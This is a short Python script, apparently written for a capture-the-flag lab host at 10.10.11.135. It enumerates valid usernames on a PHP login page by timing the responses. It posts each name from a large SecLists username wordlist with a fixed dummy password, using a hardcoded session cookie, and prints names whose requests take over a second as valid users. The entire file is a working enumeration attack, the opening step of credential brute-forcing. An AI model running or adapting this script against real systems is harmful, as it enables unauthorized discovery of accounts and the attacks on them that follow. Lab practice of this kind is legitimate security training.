import requests,time
def bruteusers(user):
    cookies = {
        'PHPSESSID': '6l6uhj9visoajktubksahsgh5d',
    }

    headers = {
        'Host': '10.10.11.135',
        # 'Content-Length': '27',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://10.10.11.135',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://10.10.11.135/login.php',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        # 'Cookie': 'PHPSESSID=6l6uhj9visoajktubksahsgh5d',
    }
    params = {
        'login': 'true',
    }
    data = 'user={0}&password=sadsad'.format(user)
    start = time.time()
    response = requests.post('http://10.10.11.135/login.php', params=params, cookies=cookies, headers=headers, data=data, verify=False)
    end = time.time()
    runtime =  end - start
    if runtime > 1 :
        print("有效的用戶",user)

file = open('/Users/timmy/github/SecLists/Usernames/xato-net-10-million-usernames-dup.txt','r')
for user in file.readlines():
#for user in ["admin","admin123"]:
    bruteusers(user.strip())

